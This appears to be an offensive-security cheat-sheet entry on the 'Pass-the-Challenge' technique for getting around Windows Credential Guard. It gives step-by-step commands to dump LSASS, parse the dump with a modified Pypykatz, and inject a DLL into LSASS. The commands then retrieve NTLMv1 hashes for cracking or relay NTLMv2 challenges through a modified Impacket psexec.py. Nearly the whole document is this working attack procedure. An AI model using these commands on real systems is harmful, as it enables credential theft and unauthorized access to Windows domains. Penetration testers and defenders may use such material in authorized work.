# Pass-the-Challenge

Link: https://github.com/ly4k/PassTheChallenge

This technique permits to retrieve the NT hashes from a LSASS dump when Credential Guard is in place. This modified version of Pypykatz must be used to parse the LDAP dump.

Link: https://github.com/ly4k/Pypykatz

## NTLMv1

##### Dump the LSASS process with Mimikatz for example

##### Parse the dump with Pypykatz

    python3 -m pypykatz lsa minidump lsass.DMP -p msv

##### Inject the SecurityPackage.dll into the LSASS process

    ./PassTheChallenge.exe inject ./SecurityPackage.dll

##### Retrieve the NTLMv1 hash

    ./PassTheChallenge.exe nthash <context handle>:<proxy info> <encrypted blob>

##### Crack the NTLMv1 hash with hashcat to retrieve the NT hash

## NTLMv2

Link: https://github.com/ly4k/Impacket

In case where only NTLMv2 is allowed, it will not be possible to crack the NTLM hash, but it is possible to pass the challenge and provide the response. It is possible to perform this attack with this modified version of Impacket. First, as above:

##### Dump the LSASS process with Mimikatz for example
##### Parse the dump with Pypykatz

    python3 -m pypykatz lsa minidump lsass.DMP -p msv

##### Inject the SecurityPackage.dll into the LSASS process

    ./PassTheChallenge.exe inject ./SecurityPackage.dll

Then, authenticate with an Impacket tool specifying CHALLENGE as password, provide the printed challenge to PassTheChallenge, and send the computed response to Impacket:

##### Authenticate with CHALLENGE as password

    psexec.py 'domain.local/user1:CHALLENGE@target.domain.local'

##### Copy paste the challenge to PassTheChallenge.exe and retrieve the response

    ./PassTheChallenge.exe challenge <context handle>:<proxy info> <encrypted blob> <challenge>

##### Paste the response to the Impacket prompt (possible that multiple response are needed)
